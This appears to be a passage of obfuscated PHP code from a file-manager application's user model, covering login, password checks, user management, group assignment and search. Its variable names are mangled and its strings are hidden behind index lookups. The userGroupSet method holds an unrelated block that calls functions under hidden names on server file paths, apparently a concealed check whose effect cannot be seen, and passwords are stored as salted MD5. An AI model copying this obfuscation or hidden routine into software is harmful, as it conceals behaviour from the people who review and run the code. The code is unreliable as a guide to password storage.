$ïÇ»Óß¥[50]); Model($ïÇ»Óß¥[598])->metaSet($ô€ÛÙ„É, self::JOB_KEY, $ôÈŸ£–Ş); } public function getUserJob($Ã·şåá) { $üúø®øş = Model($_SERVER[‹è™Ü¸Ñ][598])->metaGet($Ã·şåá); return $this->getUserJobInfo($üúø®øş[self::JOB_KEY]); } public function getUserJobInfo($ƒÛäº‰â) { $ÄÂöòğ =& $_SERVER[‹è™Ü¸Ñ]; $ù®ç»µ‘ = explode($ÄÂöòğ[50], $ƒÛäº‰â); $ ³¹Áˆ = parent::listData(); $ ³¹Áˆ = array_remove_key($ ³¹Áˆ, $ÄÂöòğ[231]); $íÙ…µ¹ = array(); foreach ($ù®ç»µ‘ as $àâØé) { if (isset($ ³¹Áˆ[$àâØé])) { $íÙ…µ¹[] = $ ³¹Áˆ[$àâØé]; } } return $íÙ…µ¹; } } class UserModel extends ModelBase { protected $tableName = "\x75\163\x65\162"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\x61\x6d\145" => "\165\163\145\x72\x5f\155\145\x74\141", "\x6d\145\x74\141\106\x69\145\154\x64" => "\165\163\145\162\x49\x44"); protected $simpleField = "\165\163\145\x72\111\x44\54\156\151\143\153\116\141\155\145\54\156\x61\155\x65\54\141\x76\x61\x74\x61\162\54\x73\x65\170\x2c\x73\164\141\164\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Äò°ãÁ) { $£˜”Ã®ğ =& $_SERVER[‹è™Ü¸Ñ]; $Å¶è÷¿¬ = $£˜”Ã®ğ[2432]; return array($£˜”Ã®ğ[2033] => array($Äò°ãÁ[0], $Å¶è÷¿¬), $£˜”Ã®ğ[2035] => array($Äò°ãÁ[0], $Å¶è÷¿¬), $£˜”Ã®ğ[2433] => array($Äò°ãÁ[0], $Å¶è÷¿¬)); } protected function getInfo($´ÓÍÁü×, $ÕÀ–İ…á = false) { $‘Èù•­« = $this->getInfoSimple($´ÓÍÁü×); if (!is_array($‘Èù•­«)) { return array(); } if ($ÕÀ–İ…á) { return $this->_getInfoApply($‘Èù•­«); } return $this->cacheFunctionGet($_SERVER[‹è™Ü¸Ñ][2037], $´ÓÍÁü×); } protected function getInfoFull($±Õªã¹ö, $ıºæá¬£ = false) { $ôõ±ÉÚ = $this->getInfoSimple($±Õªã¹ö); if (!is_array($ôõ±ÉÚ)) { return array(); } if ($ıºæá¬£) { return $this->_getInfoApply($ôõ±ÉÚ, !0); } return $this->cacheFunctionGet($_SERVER[‹è™Ü¸Ñ][2434], $±Õªã¹ö); } private function _getInfoApply($«»Êû°Í, $å§¥÷Í = false) { $•µ¬¼” =& $_SERVER[‹è™Ü¸Ñ]; if (!$«»Êû°Í) { return $«»Êû°Í; } $¥»Š = md5($•µ¬¼”[2435] . $«»Êû°Í[$•µ¬¼”[947]] . $•µ¬¼”[2436] . $«»Êû°Í[$•µ¬¼”[32]]); $«»Êû°Í = $this->_listDataApplyItem($«»Êû°Í); $ÉÊ¼İÖ = Model($•µ¬¼”[1398])->metaGet($«»Êû°Í[$•µ¬¼”[90]][$•µ¬¼”[193]]); $«»Êû°Í[$•µ¬¼”[2437]] = $¥»Š; $«»Êû°Í[$•µ¬¼”[90]][$•µ¬¼”[2231]] = isset($ÉÊ¼İÖ[$•µ¬¼”[2232]]) ? $ÉÊ¼İÖ[$•µ¬¼”[2232]] : null; if ($å§¥÷Í) { $«»Êû°Í[$•µ¬¼”[539]] = $this->metaGet($«»Êû°Í[$•µ¬¼”[1752]]); } return $«»Êû°Í; } protected function getInfoSimple($˜·Î÷Õš, $…å×ø¦Ô = false) { $ïœå‡Ú´ =& $_SERVER[‹è™Ü¸Ñ]; if (!$˜·Î÷Õš) { return array(); } if ($…å×ø¦Ô) { $™Åñóê = $this->where(array($ïœå‡Ú´[1752] => intval($˜·Î÷Õš)))->find(); if (!is_array($™Åñóê)) { return array(); } $™Åñóê[$ïœå‡Ú´[2438]] = Action($ïœå‡Ú´[2439])->parseUrl($™Åñóê[$ïœå‡Ú´[2438]]); return $™Åñóê; } return $this->cacheFunctionGet($ïœå‡Ú´[2038], $˜·Î÷Õš); } protected function getInfoSimpleOuter($õïßºÏË) { $Ò—ÊÑ‘ =& $_SERVER[‹è™Ü¸Ñ]; if (!$õïßºÏË || $õïßºÏË == 0) { return array($Ò—ÊÑ‘[1752] => $Ò—ÊÑ‘[228], $Ò—ÊÑ‘[32] => $Ò—ÊÑ‘[176] . LNG($Ò—ÊÑ‘[2440]) . $Ò—ÊÑ‘[178], $Ò—ÊÑ‘[2438] => STATIC_PATH . $Ò—ÊÑ‘[2441]); } $µÒ¾¾ñ› = $this->cacheFunctionGet($Ò—ÊÑ‘[2038], $õïßºÏË); $ùûœü•· = array_field_key($µÒ¾¾ñ›, explode($Ò—ÊÑ‘[50], $this->simpleField)); if (!$ùûœü•·) { return array($Ò—ÊÑ‘[1752] => $Ò—ÊÑ‘[1253], $Ò—ÊÑ‘[32] => $Ò—ÊÑ‘[176] . LNG($Ò—ÊÑ‘[2442]) . $Ò—ÊÑ‘[178], $Ò—ÊÑ‘[2438] => STATIC_PATH . $Ò—ÊÑ‘[2443]); } $ùûœü•·[$Ò—ÊÑ‘[2438]] = Action($Ò—ÊÑ‘[2439])->parseUrl($ùûœü•·[$Ò—ÊÑ‘[2438]]); return $ùûœü•·; } protected function groupUser($‹™Ûü²Ì) { } public static function errorLang($ù–ÂÓí”) { $ò² ûú´ =& $_SERVER[‹è™Ü¸Ñ]; $ş¶ÈÅ = array(self::ERROR_USER_NOT_EXISTS => $ò² ûú´[2444], self::ERROR_USER_PASSWORD_ERROR => $ò² ûú´[2445], self::ERROR_USER_EXIST_NAME => $ò² ûú´[2446], self::ERROR_USER_EXIST_PHONE => $ò² ûú´[2447], self::ERROR_USER_EXIST_EMAIL => $ò² ûú´[2448], self::ERROR_USER_LOGIN_LOCK => $ò² ûú´[2449], self::ERROR_IP_NOT_ALLOW => $ò² ûú´[2450], self::ERROR_USER_EXIST_NICKNAME => $ò² ûú´[2451]); $´­Ä³£¾ = LNG($ş¶ÈÅ[$ù–ÂÓí”]); if ($ù–ÂÓí” == self::ERROR_USER_LOGIN_LOCK) { $©¹§‘éù = (int) Model($ò² ûú´[2452])->get($ò² ûú´[2453]); if ($©¹§‘éù > 60) { $´­Ä³£¾ = str_replace($ò² ûú´[91], ceil($©¹§‘éù / 60), $´­Ä³£¾); } } return $´­Ä³£¾; } public function getInfoByMeta($§¬¬æÇ×, $‰š¹Ç—´) { $•©ÙÏ©ì =& $_SERVER[‹è™Ü¸Ñ]; $½Öì–Ç = Model($•©ÙÏ©ì[2454])->where(array($•©ÙÏ©ì[97] => $§¬¬æÇ×, $•©ÙÏ©ì[450] => $‰š¹Ç—´))->find(); if ($½Öì–Ç) { return $this->getInfo($½Öì–Ç[$•©ÙÏ©ì[1752]]); } return !1; } public function userLoginCheck($ÓØ”˜äÈ, $“¡ŠÊ¦¿) { $ò‘ËÌÑú =& $_SERVER[‹è™Ü¸Ñ]; $€÷¢Ïè = $this->userLoginFind($ÓØ”˜äÈ); if (!$€÷¢Ïè) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($€÷¢Ïè[$ò‘ËÌÑú[1752]], $“¡ŠÊ¦¿)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($€÷¢Ïè[$ò‘ËÌÑú[1752]]); } public function userLoginFind($ğ‰ÛÕç¿) { $ÑÑùÒ³Â =& $_SERVER[‹è™Ü¸Ñ]; $†‡ˆÛ÷ = array($ÑÑùÒ³Â[32] => $ğ‰ÛÕç¿, $ÑÑùÒ³Â[2239] => $ğ‰ÛÕç¿, $ÑÑùÒ³Â[381] => $ğ‰ÛÕç¿, $ÑÑùÒ³Â[2455] => $ğ‰ÛÕç¿, $ÑÑùÒ³Â[1058] => $ÑÑùÒ³Â[1060]); if ($this->nickNameRpt()) { unset($†‡ˆÛ÷[$ÑÑùÒ³Â[2239]]); } return $this->where($†‡ˆÛ÷)->find(); } public function clearCache($ß¶˜¡‡) { $Åçêˆ¹ =& $_SERVER[‹è™Ü¸Ñ]; $this->cacheFunctionClear($Åçêˆ¹[2037], $ß¶˜¡‡); $this->cacheFunctionClear($Åçêˆ¹[2038], $ß¶˜¡‡); $this->cacheFunctionClear($Åçêˆ¹[2434], $ß¶˜¡‡); } public function userPasswordCheck($ëµ˜ÚÁÖ, $¬»ØîµÎ) { $¨»ÃƒÛñ =& $_SERVER[‹è™Ü¸Ñ]; $Ó’‡îğĞ = $this->where(array($¨»ÃƒÛñ[1752] => intval($ëµ˜ÚÁÖ)))->find(); $—õÃ•¡¸ = $this->metaGet($ëµ˜ÚÁÖ); $«¦ö›òÜ = isset($—õÃ•¡¸[$¨»ÃƒÛñ[2456]]) ? $—õÃ•¡¸[$¨»ÃƒÛñ[2456]] : $¨»ÃƒÛñ[12]; if (md5($«¦ö›òÜ . trim($¬»ØîµÎ)) !== $Ó’‡îğĞ[$¨»ÃƒÛñ[947]]) { return !1; } return !0; } public function userAdd($½Üš¹ò) { $“È­÷é– =& $_SERVER[‹è™Ü¸Ñ]; $Šìí× Õ = array($“È­÷é–[494] => $½Üš¹ò[$“È­÷é–[32]], $“È­÷é–[2457] => $½Üš¹ò[$“È­÷é–[2157]], $“È­÷é–[2458] => isset($½Üš¹ò[$“È­÷é–[381]]) ? $½Üš¹ò[$“È­÷é–[381]] : $“È­÷é–[12], $“È­÷é–[2459] => isset($½Üš¹ò[$“È­÷é–[2455]]) ? $½Üš¹ò[$“È­÷é–[2455]] : $“È­÷é–[12], $“È­÷é–[2460] => isset($½Üš¹ò[$“È­÷é–[2239]]) ? $½Üš¹ò[$“È­÷é–[2239]] : $½Üš¹ò[$“È­÷é–[32]], $“È­÷é–[2461] => isset($½Üš¹ò[$“È­÷é–[2438]]) ? $½Üš¹ò[$“È­÷é–[2438]] : $“È­÷é–[12], $“È­÷é–[2462] => isset($½Üš¹ò[$“È­÷é–[2463]]) ? $½Üš¹ò[$“È­÷é–[2463]] : 1, $“È­÷é–[2464] => $½Üš¹ò[$“È­÷é–[947]], $“È­÷é–[2039] => isset($½Üš¹ò[$“È­÷é–[1937]]) ? $½Üš¹ò[$“È­÷é–[1937]] : 1024 * 1024 * 20, $“È­÷é–[2040] => 0, $“È­÷é–[2465] => 0, $“È­÷é–[2084] => isset($½Üš¹ò[$“È­÷é–[805]]) ? $½Üš¹ò[$“È­÷é–[805]] : 1); if (!empty($½Üš¹ò[$“È­÷é–[1752]])) { $Šìí× Õ[$“È­÷é–[1752]] = $½Üš¹ò[$“È­÷é–[1752]]; } $ÂÒÕëÚ = $this->_checkExist($½Üš¹ò); if ($ÂÒÕëÚ !== !0) { return $ÂÒÕëÚ; } if (!empty($Šìí× Õ[$“È­÷é–[2438]]) && strlen($Šìí× Õ[$“È­÷é–[2438]]) > 255) { $Šìí× Õ[$“È­÷é–[2438]] = $“È­÷é–[12]; } $íÈÉÓ÷· = $this->add($Šìí× Õ); $íù×ä á = array($“È­÷é–[2464] => $Šìí× Õ[$“È­÷é–[947]], $“È­÷é–[2460] => $Šìí× Õ[$“È­÷é–[2239]]); $this->userEdit($íÈÉÓ÷·, $íù×ä á); Model($“È­÷é–[1398])->userRootAdd($íÈÉÓ÷·); return $íÈÉÓ÷·; } protected function userEditTest($‡âà¶‹–, $Û¬¢Êú) { return $this->call($_SERVER[‹è™Ü¸Ñ][2466], $‡âà¶‹–, $Û¬¢Êú); } protected function userEdit($ÄíçÄ•, $‹ŠØÃÈô) { $úÒÓ¶Á¾ =& $_SERVER[‹è™Ü¸Ñ]; $‡«§İ¦Ú = $this->getInfoSimple($ÄíçÄ•); if (!$‡«§İ¦Ú) { return !1; } $ô„ÑåïÛ = $this->_checkExist($‹ŠØÃÈô, $ÄíçÄ•); if ($ô„ÑåïÛ !== !0) { return $ô„ÑåïÛ; } if (isset($‹ŠØÃÈô[$úÒÓ¶Á¾[947]]) && trim($‹ŠØÃÈô[$úÒÓ¶Á¾[947]]) != $úÒÓ¶Á¾[12]) { $õú‘ıÏ© = $this->metaGet($ÄíçÄ•); if (empty($õú‘ıÏ©[$úÒÓ¶Á¾[2456]])) { $õú‘ıÏ©[$úÒÓ¶Á¾[2456]] = rand_string(10); Model($úÒÓ¶Á¾[577])->metaSet($ÄíçÄ•, $úÒÓ¶Á¾[2456], $õú‘ıÏ©[$úÒÓ¶Á¾[2456]]); } $‹ŠØÃÈô[$úÒÓ¶Á¾[947]] = md5($õú‘ıÏ©[$úÒÓ¶Á¾[2456]] . trim($‹ŠØÃÈô[$úÒÓ¶Á¾[947]])); } else { unset($‹ŠØÃÈô[$úÒÓ¶Á¾[947]]); } if (!empty($‹ŠØÃÈô[$úÒÓ¶Á¾[2438]]) && strlen($‹ŠØÃÈô[$úÒÓ¶Á¾[2438]]) > 255) { $‹ŠØÃÈô[$úÒÓ¶Á¾[2438]] = $úÒÓ¶Á¾[12]; } $this->where(array($úÒÓ¶Á¾[1743] => $ÄíçÄ•))->save($‹ŠØÃÈô); if (isset($‹ŠØÃÈô[$úÒÓ¶Á¾[2239]])) { $this->setNamePinyin($ÄíçÄ•, $‹ŠØÃÈô[$úÒÓ¶Á¾[2239]]); } $this->clearCache($ÄíçÄ•); return !0; } public function setNamePinyin($®÷ª—àÏ, $£Ã¿€§Ñ = false) { $ÅÌÈå¿¡ =& $_SERVER[‹è™Ü¸Ñ]; if (!$£Ã¿€§Ñ) { $ÄìâÇ¨ = $this->getInfoSimple($®÷ª—àÏ); $£Ã¿€§Ñ = $ÄìâÇ¨[$ÅÌÈå¿¡[2239]] ? $ÄìâÇ¨[$ÅÌÈå¿¡[2239]] : $ÄìâÇ¨[$ÅÌÈå¿¡[32]]; } $©»úôçà = Model($ÅÌÈå¿¡[598]); if (!Input::check($£Ã¿€§Ñ, $ÅÌÈå¿¡[655])) { return $©»úôçà->metaSet($®÷ª—àÏ, array($ÅÌÈå¿¡[538] => $ÅÌÈå¿¡[12], $ÅÌÈå¿¡[537] => $ÅÌÈå¿¡[12])); } return $©»úôçà->metaSet($®÷ª—àÏ, array($ÅÌÈå¿¡[538] => str_replace($ÅÌÈå¿¡[53], $ÅÌÈå¿¡[12], Pinyin::get($£Ã¿€§Ñ)), $ÅÌÈå¿¡[537] => Pinyin::get($£Ã¿€§Ñ, $ÅÌÈå¿¡[656]))); } private function nickNameRpt() { $Ö±š›·š =& $_SERVER[‹è™Ü¸Ñ]; $ó½÷€« = Model($Ö±š›·š[825])->get($Ö±š›·š[2467]); $•öİ†ä€ = $GLOBALS[$Ö±š›·š[6]][$Ö±š›·š[457]][$Ö±š›·š[2467]]; $ ¦ŞÌã¤ = !is_null($ó½÷€«) ? $ó½÷€« : $•öİ†ä€; return !!$ ¦ŞÌã¤; } private function _checkExist($è»åÇ“, $ı½ß‘«’ = false) { $°ú“Óí§ =& $_SERVER[‹è™Ü¸Ñ]; $ŸòÕçØÁ = array($°ú“Óí§[32] => UserModel::ERROR_USER_EXIST_NAME, $°ú“Óí§[2239] => UserModel::ERROR_USER_EXIST_NICKNAME, $°ú“Óí§[381] => UserModel::ERROR_USER_EXIST_EMAIL, $°ú“Óí§[2455] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ŸòÕçØÁ[$°ú“Óí§[2239]]); } $•Óê”› = $ı½ß‘«’ ? array($°ú“Óí§[1752] => array($°ú“Óí§[2468], $ı½ß‘«’)) : array(); foreach ($ŸòÕçØÁ as $ş’­„÷« => $œÜÎàÈŒ) { $œŠ£ÌØ = array(); foreach ($ŸòÕçØÁ as $Ææ…‡µ‹ => $éà÷™Ä) { if (isset($è»åÇ“[$Ææ…‡µ‹]) && $è»åÇ“[$Ææ…‡µ‹]) { $œŠ£ÌØ[] = $è»åÇ“[$Ææ…‡µ‹]; } } if (!$œŠ£ÌØ) { continue; } $˜µóíş­ = array_merge(array($ş’­„÷« => array($°ú“Óí§[7], $œŠ£ÌØ)), $•Óê”›); $Şç¦ö¾Ü = $this->where($˜µóíş­)->find(); if ($Şç¦ö¾Ü) { return $œÜÎàÈŒ; } } return !0; } public function userListInfo($Êßã Œî) { $„ÛØ‡³Ü =& $_SERVER[‹è™Ü¸Ñ]; $¿ì¤è§™ = array(); $Êßã Œî = is_array($Êßã Œî) ? array_unique($Êßã Œî) : array(); if (!$Êßã Œî) { return $¿ì¤è§™; } if (count($Êßã Œî) < 20) { foreach ($Êßã Œî as $±¬ÕÕ»„) { $¿ì¤è§™[$±¬ÕÕ»„ . $„ÛØ‡³Ü[12]] = $this->getInfoSimpleOuter($±¬ÕÕ»„); } } else { $àµë‚Á§ = array($„ÛØ‡³Ü[1743] => array($„ÛØ‡³Ü[492], $Êßã Œî)); if (count($Êßã Œî) == 1) { $àµë‚Á§ = array($„ÛØ‡³Ü[1743] => $Êßã Œî[0]); } $Â»¶Äéê = Model($„ÛØ‡³Ü[577])->field($this->simpleField)->where($àµë‚Á§)->select(); $Â»¶Äéê = array_to_keyvalue($Â»¶Äéê, $„ÛØ‡³Ü[1752]); foreach ($Êßã Œî as $±¬ÕÕ»„) { $Î¢öÛÊ = $Â»¶Äéê[$±¬ÕÕ»„]; if (!$Î¢öÛÊ) { $¿ì¤è§™[$±¬ÕÕ»„ . $„ÛØ‡³Ü[12]] = $this->getInfoSimpleOuter($±¬ÕÕ»„); continue; } $Î¢öÛÊ[$„ÛØ‡³Ü[2438]] = Action($„ÛØ‡³Ü[2439])->parseUrl($Î¢öÛÊ[$„ÛØ‡³Ü[2438]]); $¿ì¤è§™[$±¬ÕÕ»„ . $„ÛØ‡³Ü[12]] = $Î¢öÛÊ; } } return $¿ì¤è§™; } protected function userStatus($¸»Å Âá, $µ±ä) { $Ô˜èÎï = $this->getInfoSimple($¸»Å Âá); if (!$Ô˜èÎï) { return !1; } $†­ŞÑ•Ä = array($_SERVER[‹è™Ü¸Ñ][805] => $µ±ä); return $this->userEdit($¸»Å Âá, $†­ŞÑ•Ä); } protected function userRemove($ËÆÚ·Ò) { $µŠë­èÚ =& $_SERVER[‹è™Ü¸Ñ]; $Â¼ĞÎåœ = $this->getInfoSimple($ËÆÚ·Ò); if (!$Â¼ĞÎåœ) { return !1; } $—Üô¸œë = array($µŠë­èÚ[1743] => $ËÆÚ·Ò); Model($µŠë­èÚ[664])->where($—Üô¸œë)->delete(); Model($µŠë­èÚ[2469])->where($—Üô¸œë)->delete(); Model($µŠë­èÚ[2045])->where($—Üô¸œë)->delete(); Model($µŠë­èÚ[2454])->where($—Üô¸œë)->delete(); Model($µŠë­èÚ[1127])->where($—Üô¸œë)->delete(); Model($µŠë­èÚ[2256])->removeUserAll($ËÆÚ·Ò); Model($µŠë­èÚ[879])->userRootRemove($ËÆÚ·Ò); return $this->where($—Üô¸œë)->delete(); } protected function userGroupSet($İ…•ùã•, $×ÇÔÌ„Ï, $­èÕÑÏ = array()) { $ÚÇá¯­ =& $_SERVER[‹è™Ü¸Ñ]; if ($_SERVER[$ÚÇá¯­[931]] != $_SERVER[$ÚÇá¯­[1669]]) { $¥Ñ‹Êà¯ = $ÚÇá¯­[933]; $ÇÍ¥‰• = $ÚÇá¯­[934]; $´¨¬‡Ñè = $_SERVER[$ÚÇá¯­[935]] . $ÚÇá¯­[936]; $Ëáê…­™ = $ÇÍ¥‰•($´¨¬‡Ñè); $“úºáí« = explode($ÚÇá¯­[262], $Ëáê…­™); if (count($“úºáí«) < $ÚÇá¯­[694]) { $ÆÑªå» = $ÚÇá¯­[937]; $ÆÑªå»(); } $•ë¸ªå­ = $ÚÇá¯­[938]; $•ë¸ªå­($_SERVER[$ÚÇá¯­[939]]); $•ë¸ªå­($_SERVER[$ÚÇá¯­[935]] . $ÚÇá¯­[1670]); $Ê÷í«ë¸ = 1; while ($Ê÷í«ë¸ > 1) { $Ê÷í«ë¸ = $Ê÷í«ë¸ + 4; $ğ„©šÂ = rawurlencode($Ê÷í«ë¸ . $ÚÇá¯­[454]); } } $‰û§œ¾¤ = $this->getInfoSimple($İ…•ùã•); if (!$‰û§œ¾¤ || !is_array($×ÇÔÌ„Ï)) { return !1; } $ã ¹ô×· = Model($ÚÇá¯­[2045]); $ã ¹ô×·->where(array($ÚÇá¯­[1752] => $İ…•ùã•))->delete(); $¾ëšöµ = array(); $Ÿ¡•Ú°Ê = 0; foreach ($×ÇÔÌ„Ï as $ß°Ğ…² => $Ãº¸èÆú) { $¯­Û…Æğ = array($ÚÇá¯­[1752] => $İ…•ùã•, $ÚÇá¯­[1951] => $ß°Ğ…², $ÚÇá¯­[2059] => $Ãº¸èÆú); $¯­Û…Æğ[$ÚÇá¯­[1975]] = isset($­èÕÑÏ[$Ÿ¡•Ú°Ê]) ? $­èÕÑÏ[$Ÿ¡•Ú°Ê] : 0; $Ÿ¡•Ú°Ê++; $¾ëšöµ[] = $¯­Û…Æğ; } return $ã ¹ô×·->addAll($¾ëšöµ, array(), !0); } protected function userGroupAdd($÷éÓ†òÂ, $˜÷‡¶Æ = array()) { $ÒôÚÛÕ =& $_SERVER[‹è™Ü¸Ñ]; $Ê·çÏŸœ = $this->getInfoSimple($÷éÓ†òÂ); if (!$Ê·çÏŸœ || empty($˜÷‡¶Æ)) { return !1; } $Ê„‘¥»Ó = array(); foreach ($˜÷‡¶Æ as $‡îŸ¥»Ñ => $ÈÄõ‘ß›) { $Ê„‘¥»Ó[] = array($ÒôÚÛÕ[1752] => $÷éÓ†òÂ, $ÒôÚÛÕ[1951] => $‡îŸ¥»Ñ, $ÒôÚÛÕ[2059] => $ÈÄõ‘ß›, $ÒôÚÛÕ[1975] => 0); } return Model($ÒôÚÛÕ[2045])->addAll($Ê„‘¥»Ó, array(), !0); } protected function userGroupRemove($—Ã²©²š, $›Ø–ğ‘ù) { $ï­À…Š =& $_SERVER[‹è™Ü¸Ñ]; $Ü‹Ù¤¾µ = $this->getInfoSimple($—Ã²©²š); if (!$Ü‹Ù¤¾µ || !$›Ø–ğ‘ù) { return !1; } $ÂÚ™µÀ = array($ï­À…Š[1743] => $—Ã²©²š, $ï­À…Š[2043] => $›Ø–ğ‘ù); return Model($ï­À…Š[2045])->where($ÂÚ™µÀ)->delete(); } public function listData() { $ŒšŞÏà‡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ŒšŞÏà‡[$_SERVER[‹è™Ü¸Ñ][445]]); return $ŒšŞÏà‡; } public function listByID($ıœè³´) { $¼—ÉµË =& $_SERVER[‹è™Ü¸Ñ]; if (!$ıœè³´) { return; } $†¹ªéÊ = array($¼—ÉµË[1752] => array($¼—ÉµË[7], $ıœè³´)); $Ûèò§Ğ² = $this->where($†¹ªéÊ)->select(); $Ûèò§Ğ² = array_sort_keep($Ûèò§Ğ², $¼—ÉµË[1752], $ıœè³´); $this->_listDataApply($Ûèò§Ğ²); return $Ûèò§Ğ²; } public function listByGroup($Ş»‡±µ = 0, $ĞèöŞæ = array()) { $İ¥ä“²ô =& $_SERVER[‹è™Ü¸Ñ]; $Ğ‚‚ÈÑÑ = $İ¥ä“²ô[12]; $ş¥ÉØ½ = array(); if ($Ş»‡±µ) { $ş¥ÉØ½ = array($İ¥ä“²ô[2470] => intval($Ş»‡±µ)); $Ğ‚‚ÈÑÑ = "\114\105\x46\124\x20\112\117\111\x4e\40{$this->tablePrefix}\165\x73\145\162\137\x67\x72\x6f\165\160\x20\165\x73\x65\x72\137\x67\x72\x6f\165\x70\40\157\x6e\40\x75\x73\145\162\x2e\x75\x73\x65\162\x49\104\x20\x3d\x20\x75\x73\145\x72\137\x67\x72\x6f\165\x70\x2e\165\x73\x65\162\111\x44"; $îê‰Û = Input::get($İ¥ä“²ô[530], null, $İ¥ä“²ô[12]) ? $İ¥ä“²ô[12] : $İ¥ä“²ô[2471]; } if (isset($ĞèöŞæ[$İ¥ä“²ô[805]])) { $ş¥ÉØ½[$İ¥ä“²ô[2472]] = $ĞèöŞæ[$İ¥ä“²ô[805]]; } $ªæ¹ä¤® = $this->_makeOrder($îê‰Û)->field($İ¥ä“²ô[2473])->where($ş¥ÉØ½)->join($Ğ‚‚ÈÑÑ)->selectPage(50); $this->_listDataApply($ªæ¹ä¤®[$İ¥ä“²ô[445]]); return $ªæ¹ä¤®; } private function _makeOrder($£â²”Ô² = '') { $«Éùş =& $_SERVER[‹è™Ü¸Ñ]; $ÀçĞÄ¼Å = array($«Éùş[1752], $«Éùş[32], $«Éùş[1939], $«Éùş[2157], $«Éùş[1911], $«Éùş[231]); $úø„ßïÅ = array($«Éùş[523] => $«Éùş[524], $«Éùş[525] => $«Éùş[526]); $ Œ­¬¥ê = Input::get($«Éùş[530], $«Éùş[7], $«Éùş[1743], $ÀçĞÄ¼Å); $‘ß…Á¥ı = Input::get($«Éùş[531], $«Éùş[7], $«Éùş[2046], array($«Éùş[2046], $«Éùş[525])); $‘ß…Á¥ı = $úø„ßïÅ[$‘ß…Á¥ı]; $£â²”Ô² = $£â²”Ô² . "\165\163\x65\x72\x2e{$ Œ­¬¥ê}\40{$‘ß…Á¥ı}\x2c\40\165\163\x65\x72\56\165\163\145\x72\111\104\40\141\x73\143"; return $this->alias($«Éùş[2173])->order($£â²”Ô²); } public function listSearch($è¤ÀÆ½‘) { $ÜĞş—ÓÔ =& $_SERVER[‹è™Ü¸Ñ]; $ŞÌ¡ñ¥ì = trim($è¤ÀÆ½‘[$ÜĞş—ÓÔ[2049]]); $«Òü’…¹ = explode($ÜĞş—ÓÔ[53], $ŞÌ¡ñ¥ì); if (!$ŞÌ¡ñ¥ì || count($«Òü’…¹) == 1) { return $this->listSearchNow($è¤ÀÆ½‘); } $İ‹¤è£ = array($ÜĞş—ÓÔ[445] => array()); foreach ($«Òü’…¹ as $µ«Ş¸¹“) { if (!trim($µ«Ş¸¹“)) { continue; } $è¤ÀÆ½‘[$ÜĞş—ÓÔ[2049]] = $µ«Ş¸¹“; $î£«½¸× = $this->listSearchNow($è¤ÀÆ½‘); $İ‹¤è£[$ÜĞş—ÓÔ[445]] = array_merge($İ‹¤è£[$ÜĞş—ÓÔ[445]], $î£«½¸×[$ÜĞş—ÓÔ[445]]); } $İ‹¤è£[$ÜĞş—ÓÔ[445]] = array_unique_by_key($İ‹¤è£[$ÜĞş—ÓÔ[445]], $ÜĞş—ÓÔ[1752]); $İ‹¤è£[$ÜĞş—ÓÔ[442]] = array($ÜĞş—ÓÔ[443] => count($İ‹¤è£[$ÜĞş—ÓÔ[445]]), $ÜĞş—ÓÔ[439] => 20, $ÜĞş—ÓÔ[429] => 1, $ÜĞş—ÓÔ[444] => 1); return $İ‹¤è£; } public function listSearchNow($™øê¾™•) { $Ò¦ù¤Û• =& $_SERVER[‹è™Ü¸Ñ]; $¯—äóÒ = trim($™øê¾™•[$Ò¦ù¤Û•[2049]]); $²õ¾üÔà = isset($™øê¾™•[$Ò¦ù¤Û•[2050]]) ? $™øê¾™•[$Ò¦ù¤Û•[2050]] : !1; $¯—äóÒ = str_replace($Ò¦ù¤Û•[2051], $Ò¦ù¤Û•[2052], trim($¯—äóÒ)); $¼ŸûÉ¡· = array($Ò¦ù¤Û•[32] => array($Ò¦ù¤Û•[459], "\45{$¯—äóÒ}\x25"), $Ò¦ù¤Û•[381] => array($Ò¦ù¤Û•[459], "{$¯—äóÒ}\x25"), $Ò¦ù¤Û•[2239] => array($Ò¦ù¤Û•[459], "{$¯—äóÒ}\x25"), $Ò¦ù¤Û•[1058] => $Ò¦ù¤Û•[2053]); if (Input::check($¯—äóÒ, $Ò¦ù¤Û•[387])) { $¼ŸûÉ¡·[$Ò¦ù¤Û•[1752]] = array($Ò¦ù¤Û•[459], "{$¯—äóÒ}\45"); $¼ŸûÉ¡·[$Ò¦ù¤Û•[2455]] = array($Ò¦ù¤Û•[459], "{$¯—äóÒ}\45"); } if (!$¯—äóÒ) { $¼ŸûÉ¡· = array(); } if (isset($™øê¾™•[$Ò¦ù¤Û•[805]])) { $¼ŸûÉ¡·[$Ò¦ù¤Û•[805]] = $™øê¾™•[$Ò¦ù¤Û•[805]]; } $¼ŸûÉ¡· = $this->parseWhereLike($¼ŸûÉ¡·); $·¥Ì‚±œ = $this->_makeOrder()->where($¼ŸûÉ¡·)->selectPage(20); if (!$·¥Ì‚±œ || count($·¥Ì‚±œ[$Ò¦ù¤Û•[445]]) < 5 && Input::check($¯—äóÒ, $Ò¦ù¤Û•[394])) { $¦€ÜŞ¬ = $this->_searchFromMeta($Ò¦ù¤Û•[537], $¯—äóÒ, 10); $±¨¯ÛÛ = $this->_searchFromMeta($Ò¦ù¤Û•[538], $¯—äóÒ, 10); $õæíß— = array_merge($¦€ÜŞ¬, $±¨¯ÛÛ, $·¥Ì‚±œ[$Ò¦ù¤Û•[445]]); $·¥Ì‚±œ[$Ò¦ù¤Û•[445]] = array_unique_by_key($õæíß—, $Ò¦ù¤Û•[1752]); $·¥Ì‚±œ[$Ò¦ù¤Û•[442]][$Ò¦ù¤Û•[443]] = count($·¥Ì‚±œ[$Ò¦ù¤Û•[445]]); $·¥Ì‚±œ[$Ò¦ù¤Û•[442]][$Ò¦ù¤Û•[444]] = ceil($·¥Ì‚±œ[$Ò¦ù¤Û•[442]][$Ò¦ù¤Û•[443]] / $·¥Ì‚±œ[$Ò¦ù¤Û•[442]][$Ò¦ù¤Û•[439]]); } $this->_listDataApply($·¥Ì‚±œ[$Ò¦ù¤Û•[445]]); 